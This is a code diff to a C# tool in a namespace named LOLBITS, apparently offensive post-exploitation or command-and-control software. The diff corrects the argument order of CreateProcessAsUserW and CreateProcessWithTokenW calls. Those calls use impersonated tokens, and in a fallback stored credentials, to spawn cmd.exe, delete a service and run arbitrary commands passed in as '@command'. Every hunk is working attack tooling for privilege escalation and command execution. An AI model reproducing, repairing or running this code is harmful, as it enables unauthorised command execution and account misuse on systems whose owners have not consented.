@@ -394,7 +394,7 @@ namespace LOLBITS
         public static void DetermineImpersonationMethod(IntPtr token, LogonFlags l, StartupInfo startupInfo, out ProcessInformation processInfo)
 
         {
-            if (CreateProcessAsUserW(token, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+            if (CreateProcessAsUserW(token, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                 TokenManager.Method = 1;
             else 
             if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", 0,
@@ -497,8 +497,8 @@ namespace LOLBITS
 
                 const LogonFlags logonFlags = new LogonFlags();
 
-                if (CreateProcessAsUserW(newToken,
-                    @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, IntPtr.Zero,
+                if (CreateProcessAsUserW(newToken, null,
+                    @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", IntPtr.Zero,
                     IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _))
                 {
                     TokenManager.Token = newToken;
@@ -506,8 +506,8 @@ namespace LOLBITS
                 }
                 else
                 {
-                    if (!CreateProcessWithTokenW(newToken, logonFlags,
-                        @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, 0, IntPtr.Zero,
+                    if (!CreateProcessWithTokenW(newToken, logonFlags, null,
+                        @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", 0, IntPtr.Zero,
                         null, ref startupInfo, out _)) return;
                     TokenManager.Token = newToken;
                     TokenManager.Method = 2;
@@ -572,10 +572,10 @@ namespace LOLBITS
                 switch (TokenManager.Method)
                 {
                     case 1:
-                        CreateProcessAsUserW(TokenManager.Token, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _);
+                        CreateProcessAsUserW(TokenManager.Token, null, @"c:\windows\system32\cmd.exe /Q /C" + @command, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out _);
                         break;
                     case 2:
-                        CreateProcessWithTokenW(TokenManager.Token, l, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, 0, IntPtr.Zero, null, ref startupInfo, out _);
+                        CreateProcessWithTokenW(TokenManager.Token, l, null, @"c:\windows\system32\cmd.exe /Q /C" + @command, 0, IntPtr.Zero, null, ref startupInfo, out _);
                         break;
                     default:
                         CreateProcessWithLogonW(TokenManager.Credentials[0], TokenManager.Credentials[1], TokenManager.Credentials[2], l, null, @"c:\windows\system32\cmd.exe /Q /C" + command, 0, 0, null, ref startupInfo, out _);
